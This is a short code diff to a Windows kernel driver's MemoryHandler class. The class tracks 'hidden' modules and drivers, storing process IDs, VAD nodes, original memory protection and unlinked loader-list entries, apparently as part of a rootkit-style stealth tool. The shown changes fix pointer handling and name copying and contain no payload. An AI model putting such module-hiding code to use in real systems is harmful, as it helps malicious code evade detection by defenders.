 _IRQL_requires_max_(APC_LEVEL)
 HiddenModuleEntry* MemoryHandler::FindHiddenModule(_In_ HiddenModuleEntry& info) const {
-	if (!info.ModuleName || !IsValidPath(info.ModuleName) || info.Pid <= SYSTEM_PROCESS_PID)
+	if (!IsValidPath(info.ModuleName) || info.Pid <= SYSTEM_PROCESS_PID)
 		ExRaiseStatus(STATUS_INVALID_PARAMETER);
 
 	auto finder = [](_In_ const HiddenModuleEntry* item, _In_ HiddenModuleEntry& infoToSearch) {
@@ -1434,7 +1794,7 @@ HiddenModuleEntry* MemoryHandler::FindHiddenModule(_In_ HiddenModuleEntry& info)
 * @status [ULONG]			  -- If found the index else ITEM_NOT_FOUND.
 */
 _IRQL_requires_max_(DISPATCH_LEVEL)
-bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenDriverEntry* driverEntry) const {
+bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenDriverEntry** driverEntry) const {
 	if (!driverPath || !IsValidPath(driverPath))
 		return false;
 
@@ -1447,7 +1807,7 @@ bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenD
 		return false;
 
 	if (driverEntry)
-		driverEntry = item;
+		*driverEntry = item;
 	return true;
 }
 
@@ -1464,6 +1824,7 @@ bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenD
 _IRQL_requires_max_(APC_LEVEL)
 bool MemoryHandler::AddHiddenModule(_Inout_ HiddenModuleEntry& item) {
 	HiddenModuleEntry* entry = nullptr;
+
 	if (!IsValidPath(item.ModuleName) || item.Pid <= SYSTEM_PROCESS_PID)
 		return false;
 
@@ -1481,20 +1842,16 @@ bool MemoryHandler::AddHiddenModule(_Inout_ HiddenModuleEntry& item) {
 
 	if (!entry)
 		return false;
+	entry->ModuleName = item.ModuleName;
+	entry->VadModuleName = item.VadModuleName;
 	entry->Pid = item.Pid;
 	entry->OriginalVadProtection = item.OriginalVadProtection;
+	entry->OriginalEntry = item.OriginalEntry;
 	entry->VadNode = item.VadNode;
 	entry->Links.HashLinks = item.Links.HashLinks;
 	entry->Links.InInitializationOrderLinks = item.Links.InInitializationOrderLinks;
 	entry->Links.InLoadOrderLinks = item.Links.InLoadOrderLinks;
 	entry->Links.InMemoryOrderLinks = item.Links.InMemoryOrderLinks;
-
-	errno_t err = wcscpy_s(entry->ModuleName, (wcslen(item.ModuleName) + 1) * sizeof(wchar_t), item.ModuleName);
-
-	if (err != 0) {
-		FreeVirtualMemory(entry);
-		return false;
-	}
 	AddEntry(&this->hiddenModules, entry);
 	return true;
 }
